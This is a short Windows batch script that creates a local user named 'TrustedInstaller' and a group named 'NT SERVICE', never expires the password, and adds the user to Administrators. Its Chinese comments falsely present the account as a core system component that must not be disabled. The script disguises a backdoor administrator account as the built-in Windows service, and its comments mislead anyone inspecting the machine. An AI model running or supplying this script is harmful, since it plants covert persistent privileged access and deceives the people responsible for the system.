net localgroup "NT SERVICE" /add
net localgroup "NT SERVICE" /COMMENT:"提供对Windows系统域及内核程序及文件的访问权限，为系统运行所需要的核心文件提供权限验证。"
net user TrustedInstaller @password /add
net user TrustedInstaller /ACTIVE:yes
net user TrustedInstaller /COMMENT:"提供基于NT SERVICE的权限控制，禁用后可能导致由MicroSoft签名的软件无法安装。"
net user TrustedInstaller /EXPIRES:NEVER
net user TrustedInstaller /FULLNAME:"Windows TrustedInstaller"
net user TrustedInstaller /PASSWORDCHG:NO
net user TrustedInstaller /PASSWORDREQ:YES
net localgroup "Users" TrustedInstaller /delete
net localgroup "NT SERVICE" TrustedInstaller /add
net localgroup "Administrators" TrustedInstaller /add
start control userpasswords2
pause